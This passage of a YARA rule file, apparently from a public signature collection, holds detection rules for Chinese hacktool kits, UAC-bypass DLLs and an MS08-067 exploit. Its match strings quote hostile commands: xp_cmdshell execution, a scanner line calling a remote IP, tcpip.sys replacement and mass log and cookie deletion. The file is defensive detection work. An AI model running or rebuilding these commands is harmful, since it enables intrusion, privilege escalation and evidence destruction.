		$s4 = "<VersionCreatedBy>14.4.0</VersionCreatedBy>" fullword
		$s8 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P"
		$s9 = "Running Zip pipeline..." fullword
		$s10 = "<FinTitle />" fullword
		$s12 = "<AutoTemp>0</AutoTemp>" fullword
		$s14 = "<DefaultDir>%TEMP%</DefaultDir>" fullword
		$s15 = "AES Encrypting..." fullword
		$s20 = "<UnzipDir>%TEMP%</UnzipDir>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuac2
{
	meta:
		description = "Auto-generated rule - file BypassUac2.zip"
		author = "yarGen Yara Rule Generator"
		id = "8b7e49de-9b0a-5dc4-86af-1a854dc649cc"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L955-L967"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
		logic_hash = "398783fa0453a60fd1c6aa64eacfbfa7c5385e81c79d1b6a8a8386dae9b825cc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
		$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
		$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuac_3
{
	meta:
		description = "Auto-generated rule - file BypassUacDll.dll"
		author = "yarGen Yara Rule Generator"
		id = "407a8e12-1160-584d-94c8-7aa78e29c754"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L969-L982"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1974aacd0ed987119999735cad8413031115ce35"
		logic_hash = "cf3183ff4562f2962f87bc594c1710c73c113fa1d49fa56f7a3ff391ba4b9003"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s0 = "BypassUacDLL.dll" fullword wide
		$s1 = "\\Release\\BypassUacDll" ascii
		$s3 = "Win7ElevateDLL" fullword wide
		$s7 = "BypassUacDLL" fullword wide

	condition:
		3 of them
}

rule SIGNATURE_BASE_Bypassuacdll_6
{
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		id = "5be27053-446f-5ea3-a242-2661aeffa3df"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1000-L1011"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
		logic_hash = "3cb89875ddf79a3709aeb58149e228e03b9fb43fa1565aab5ece743857b4cc71"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuac_EXE
{
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		id = "b88aded5-7dfb-5cdf-bb42-cd8b069259e0"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1013-L1027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
		logic_hash = "0283efd6866ed9417f2d255715f04c0ed6d7a89befce6a3a52c22ac06593c0bd"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s1 = "Wole32.dll" wide
		$s3 = "System32\\migwiz" wide
		$s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
		$s5 = "Elevation:Administrator!new:" wide
		$s6 = "BypassUac" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_Proxy_Malware_Packed_Dev
{
	meta:
		description = "APT Malware - Proxy"
		author = "FRoth"
		id = "0b81b6c9-86fa-59c1-b58c-80310f6c0680"
		date = "2014-11-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1029-L1044"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6b6a86ceeab64a6cb273debfa82aec58"
		logic_hash = "64b15aaf93b40744b887c75fa26f4996d72045a55ac82ab4de89a0d9a3714684"
		score = 50
		quality = 85
		tags = ""

	strings:
		$string0 = "PECompact2" fullword
		$string1 = "[LordPE]"
		$string2 = "steam_ker.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_Tzddos_Ddos_Tool_CN
{
	meta:
		description = "Disclosed hacktool set - file tzddos"
		author = "Florian Roth (Nextron Systems)"
		id = "bf2bfc7b-4db8-5d35-a312-2530a42985d5"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1046-L1065"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d4c517eda5458247edae59309453e0ae7d812f8e"
		logic_hash = "fed09a8586f9b573e46871efa71082f4573d2bd069fde9cc2928b267d0025bab"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "for /f %%a in (host.txt) do (" ascii
		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
		$s2 = "del host.txt /q" fullword ascii
		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
		$s4 = "start Http.exe %%a %http%" fullword ascii
		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
		$s6 = "del Result.txt s2.txt s1.txt " fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Ncat_Hacktools_CN
{
	meta:
		description = "Disclosed hacktool set - file nc.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bdbfaf75-f8c0-508e-b6b1-9ddea179a325"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1067-L1085"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "001c0c01c96fa56216159f83f6f298755366e528"
		logic_hash = "0e059e90447747ed5259da4a870036d37d181c1cfea734ab25e760e81612f0f3"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s2 = "nc [-options] hostname port[s] [ports] ... " fullword ascii
		$s3 = "gethostpoop fuxored" fullword ascii
		$s6 = "VERNOTSUPPORTED" fullword ascii
		$s7 = "%s [%s] %d (%s)" fullword ascii
		$s12 = " `--%s' doesn't allow an argument" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_MS08_067_Exploit_Hacktools_CN
{
	meta:
		description = "Disclosed hacktool set - file cs.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c15836c7-e739-5cc0-9d41-d651ea3e4738"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1087-L1106"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a3e9e0655447494253a1a60dbc763d9661181322"
		logic_hash = "e5756250de401324d0c86f855bc088c8364e4a632cece25e553939fa621b73d8"
		score = 60
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "MS08-067 Exploit for CN by EMM@ph4nt0m.org" fullword ascii
		$s3 = "Make SMB Connection error:%d" fullword ascii
		$s5 = "Send Payload Over!" fullword ascii
		$s7 = "Maybe Patched!" fullword ascii
		$s8 = "RpcExceptionCode() = %u" fullword ascii
		$s11 = "ph4nt0m" fullword wide
		$s12 = "\\\\%s\\IPC" ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Hacktools_CN_Burst_Sql
{
	meta:
		description = "Disclosed hacktool set - file sql.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "77ea95fc-7a6a-522b-8a72-1832598c4d2d"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1108-L1129"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d5139b865e99b7a276af7ae11b14096adb928245"
		logic_hash = "139f7308055351d9dc8a704c055360ac9408dcefc9eee4b9f222886fb5249b8c"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "s.exe %s %s %s %s %d /save" fullword ascii
		$s2 = "s.exe start error...%d" fullword ascii
		$s4 = "EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'" fullword ascii
		$s7 = "EXEC master..xp_cmdshell 'wscript.exe cc.js'" fullword ascii
		$s10 = "Result.txt" fullword ascii
		$s11 = "Usage:sql.exe [options]" fullword ascii
		$s17 = "%s root %s %d error" fullword ascii
		$s18 = "Pass.txt" fullword ascii
		$s20 = "SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\sillyr_x.so' FROM sillyr_x" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_Hacktools_CN_Panda_445TOOL
{
	meta:
		description = "Disclosed hacktool set - file 445TOOL.rar"
		author = "Florian Roth (Nextron Systems)"
		id = "02075631-49cc-5b97-ad8e-92d734a26d34"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1131-L1147"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "92050ba43029f914696289598cf3b18e34457a11"
		logic_hash = "69a17bf7735eea946a5326d9535e68b8f010f2a0229875970b1bb15029c6dc4e"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "scan.bat" fullword ascii
		$s1 = "Http.exe" fullword ascii
		$s2 = "GOGOGO.bat" fullword ascii
		$s3 = "ip.txt" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hacktools_CN_Panda_445
{
	meta:
		description = "Disclosed hacktool set - file 445.rar"
		author = "Florian Roth (Nextron Systems)"
		id = "02075631-49cc-5b97-ad8e-92d734a26d34"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1149-L1169"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a61316578bcbde66f39d88e7fc113c134b5b966b"
		logic_hash = "d3f5b2c601dfa1702bbd1f8bdc1f847dd34ba84a6c527a3e02cdb76075e4ad2c"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "for /f %%i in (ips.txt) do (start cmd.bat %%i)" fullword ascii
		$s1 = "445\\nc.exe" fullword ascii
		$s2 = "445\\s.exe" fullword ascii
		$s3 = "cs.exe %1" fullword ascii
		$s4 = "445\\cs.exe" fullword ascii
		$s5 = "445\\ip.txt" fullword ascii
		$s6 = "445\\cmd.bat" fullword ascii
		$s9 = "@echo off" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hacktools_CN_Wineggdrop
{
	meta:
		description = "Disclosed hacktool set - file s.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9b6244ee-5ace-5caa-bfa2-732bcfcfc998"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1171-L1194"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7665011742ce01f57e8dc0a85d35ec556035145d"
		logic_hash = "6123a07038e30e11e37a70b912a1c854c13341e67eaf4ed14ca9954288a42d62"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Normal Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s2 = "SYN Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s6 = "Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner" fullword ascii
		$s8 = "Something Wrong About The Ports" fullword ascii
		$s9 = "Performing Time: %d/%d/%d %d:%d:%d --> " fullword ascii
		$s10 = "Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save" fullword ascii
		$s12 = "%u Ports Scanned.Taking %d Threads " fullword ascii
		$s13 = "%-16s %-5d -> \"%s\"" fullword ascii
		$s14 = "SYN Scan Can Only Perform On WIN 2K Or Above" fullword ascii
		$s17 = "SYN Scan: About To Scan %s:%d Using %d Thread" fullword ascii
		$s18 = "Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports" fullword ascii

	condition:
		5 of them
}

rule SIGNATURE_BASE_Hacktools_CN_Scan_BAT
{
	meta:
		description = "Disclosed hacktool set - file scan.bat"
		author = "Florian Roth (Nextron Systems)"
		id = "836e0618-93c7-5519-bbc4-705ff5c2e127"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1196-L1214"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6517d7c245f1300e42f7354b0fe5d9666e5ce52a"
		logic_hash = "eed941d2ad5d33d7224504b08d2104d4043fab7a2ff027fc54cd1afd42e32549"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "for /f %%a in (host.txt) do (" ascii
		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
		$s2 = "del host.txt /q" fullword ascii
		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
		$s4 = "start Http.exe %%a %http%" fullword ascii
		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii

	condition:
		5 of them
}

rule SIGNATURE_BASE_Hacktools_CN_Panda_Burst
{
	meta:
		description = "Disclosed hacktool set - file Burst.rar"
		author = "Florian Roth (Nextron Systems)"
		id = "e07c66d1-958e-5ad2-9d5b-380d48af8360"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1216-L1229"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ce8e3d95f89fb887d284015ff2953dbdb1f16776"
		logic_hash = "c334019cab377f4d96f5daee6a2f1fa7e24ecc43b3aee1eb76537640fdfd8a97"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr." ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hacktools_CN_GOGOGO_Bat
{
	meta:
		description = "Disclosed hacktool set - file GOGOGO.bat"
		author = "Florian Roth (Nextron Systems)"
		id = "b52cc150-81d4-5895-8f83-ee2006f75617"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1248-L1273"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4bd4f5b070acf7fe70460d7eefb3623366074bbd"
		logic_hash = "0209ffba87ff07379c768c1c00496a37f0f9bc6b786a31afdafe55d65a9f39ab"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "for /f \"delims=\" %%x in (endend.txt) do call :lisoob %%x" fullword ascii
		$s1 = "http://www.tzddos.com/ -------------------------------------------->byebye.txt" fullword ascii
		$s2 = "ren %systemroot%\\system32\\drivers\\tcpip.sys tcpip.sys.bak" fullword ascii
		$s4 = "IF /I \"%wangle%\"==\"\" ( goto start ) else ( goto erromm )" fullword ascii
		$s5 = "copy *.tzddos scan.bat&del *.tzddos" fullword ascii
		$s6 = "del /f tcpip.sys" fullword ascii
		$s9 = "if /i \"%CB%\"==\"www.tzddos.com\" ( goto mmbat ) else ( goto wangle )" fullword ascii
		$s10 = "call scan.bat" fullword ascii
		$s12 = "IF /I \"%erromm%\"==\"\" ( goto start ) else ( goto zuihoujh )" fullword ascii
		$s13 = "IF /I \"%zuihoujh%\"==\"\" ( goto start ) else ( goto laji )" fullword ascii
		$s18 = "sc config LmHosts start= auto" fullword ascii
		$s19 = "copy tcpip.sys %systemroot%\\system32\\drivers\\tcpip.sys > nul" fullword ascii
		$s20 = "ren %systemroot%\\system32\\dllcache\\tcpip.sys tcpip.sys.bak" fullword ascii

	condition:
		3 of them
}

rule SIGNATURE_BASE_Hacktools_CN_Burst_Pass
{
	meta:
		description = "Disclosed hacktool set - file pass.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "d8f6784f-80c8-51e2-9d86-40022cd8705d"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1275-L1298"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "55a05cf93dbd274355d798534be471dff26803f9"
		logic_hash = "3a30cc602a66bd87304756311d56e7c698c1edb0b4b209198c589c4792776992"
		score = 60
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "123456.com" fullword ascii
		$s1 = "123123.com" fullword ascii
		$s2 = "360.com" fullword ascii
		$s3 = "123.com" fullword ascii
		$s4 = "juso.com" fullword ascii
		$s5 = "sina.com" fullword ascii
		$s7 = "changeme" fullword ascii
		$s8 = "master" fullword ascii
		$s9 = "google.com" fullword ascii
		$s10 = "chinanet" fullword ascii
		$s12 = "lionking" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hacktools_CN_Johor_Posts_Killer
{
	meta:
		description = "Disclosed hacktool set - file JoHor_Posts_Killer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "68bba78e-f3a0-5eaa-9c63-e5f23a76b328"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1300-L1321"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d157f9a76f9d72dba020887d7b861a05f2e56b6a"
		logic_hash = "2fc63cd42619a2b92ab8670b14ab4c01eb3b194cd337d329ba224b7088d26318"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Multithreading Posts_Send Killer" fullword ascii
		$s3 = "GET [Access Point] HTTP/1.1" fullword ascii
		$s6 = "The program's need files was not exist!" fullword ascii
		$s7 = "JoHor_Posts_Killer" fullword wide
		$s8 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
		$s10 = "  ( /s ) :" fullword ascii
		$s11 = "forms.vbp" fullword ascii
		$s12 = "forms.vcp" fullword ascii
		$s13 = "Software\\FlySky\\E\\Install" fullword ascii

	condition:
		5 of them
}

rule SIGNATURE_BASE_Hacktools_CN_Panda_Tesksd
{
	meta:
		description = "Disclosed hacktool set - file tesksd.jpg"
		author = "Florian Roth (Nextron Systems)"
		id = "399ff307-c2e8-57bb-b792-a2c599e8686e"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1323-L1338"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb"
		logic_hash = "dc81acef0ad3e6307f68ee755e5b27f2dcf1e2822e560a72dc5ae572703f4459"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
		$s1 = "ExeMiniDownload.exe" fullword wide
		$s16 = "POST %Hs" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hacktools_CN_Burst_Start
{
	meta:
		description = "Disclosed hacktool set - file Start.bat - DoS tool"
		author = "Florian Roth (Nextron Systems)"
		id = "1291fbc5-fbb3-5425-bb9a-e45f4d7cf562"
		date = "2014-11-17"
		modified = "2023-01-27"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1358-L1380"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "75d194d53ccc37a68286d246f2a84af6b070e30c"
		logic_hash = "b435957150da7b790809d2cf90a01c967127c183ddcbf333beda1a7c599b69a5"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "for /f \"eol= tokens=1,2 delims= \" %%i in (ip.txt) do (" ascii
		$s1 = "Blast.bat /r 600" fullword ascii
		$s2 = "Blast.bat /l Blast.bat" fullword ascii
		$s3 = "Blast.bat /c 600" fullword ascii
		$s4 = "start Clear.bat" fullword ascii
		$s5 = "del Result.txt" fullword ascii
		$s6 = "s syn %%i %%j 3306 /save" fullword ascii
		$s7 = "start Thecard.bat" fullword ascii
		$s10 = "setlocal enabledelayedexpansion" fullword ascii

	condition:
		5 of them
}

rule SIGNATURE_BASE_Hacktools_CN_Panda_Tasksvr
{
	meta:
		description = "Disclosed hacktool set - file tasksvr.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "5c85b382-551a-5e9e-9af8-d106cbe26f74"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1382-L1397"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a73fc74086c8bb583b1e3dcfd326e7a383007dc0"
		logic_hash = "183708e525ec6676662b59a2a3c79f5113a80f2d5b3bd4713c74a536fe303b2d"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Consys21.dll" fullword ascii
		$s4 = "360EntCall.exe" fullword wide
		$s15 = "Beijing1" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hacktools_CN_Burst_Clear
{
	meta:
		description = "Disclosed hacktool set - file Clear.bat"
		author = "Florian Roth (Nextron Systems)"
		id = "21f33a36-779e-5eac-819c-ef79f291b43c"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1398-L1419"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "148c574a4e6e661aeadaf3a4c9eafa92a00b68e4"
		logic_hash = "d10ed2c6ea3f1a8b289529cc90f50f84288003576aced903f48db3c2abc4722d"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "del /f /s /q %systemdrive%\\*.log    " fullword ascii
		$s1 = "del /f /s /q %windir%\\*.bak    " fullword ascii
		$s4 = "del /f /s /q %systemdrive%\\*.chk    " fullword ascii
		$s5 = "del /f /s /q %systemdrive%\\*.tmp    " fullword ascii
		$s8 = "del /f /q %userprofile%\\COOKIES s\\*.*    " fullword ascii
		$s9 = "rd /s /q %windir%\\temp & md %windir%\\temp    " fullword ascii
		$s11 = "del /f /s /q %systemdrive%\\recycled\\*.*    " fullword ascii
		$s12 = "del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\"    " fullword ascii
		$s19 = "del /f /s /q \"%userprofile%\\Local Settings\\Temporary Internet Files\\*.*\"   " ascii

	condition:
		5 of them
}

rule SIGNATURE_BASE_Hacktools_CN_Burst_Thecard
{
	meta:
		description = "Disclosed hacktool set - file Thecard.bat"
		author = "Florian Roth (Nextron Systems)"
		id = "a9946aeb-2042-522f-8d91-f8b96341bb64"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1421-L1438"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "50b01ea0bfa5ded855b19b024d39a3d632bacb4c"
		logic_hash = "29e1fb2e0bfa60e5406f9fd1c0ec99f0fc1b416ffc4d59846627e40959a32c63"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "tasklist |find \"Clear.bat\"||start Clear.bat" fullword ascii
		$s1 = "Http://www.coffeewl.com" fullword ascii
		$s2 = "ping -n 2 localhost 1>nul 2>nul" fullword ascii
		$s3 = "for /L %%a in (" ascii
		$s4 = "MODE con: COLS=42 lines=5" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hacktools_CN_Burst_Blast
{
	meta:
		description = "Disclosed hacktool set - file Blast.bat"
		author = "Florian Roth (Nextron Systems)"
		id = "9ac723c4-e88d-5fb3-b18f-c8b764c8acf3"
		date = "2014-11-17"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1440-L1454"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
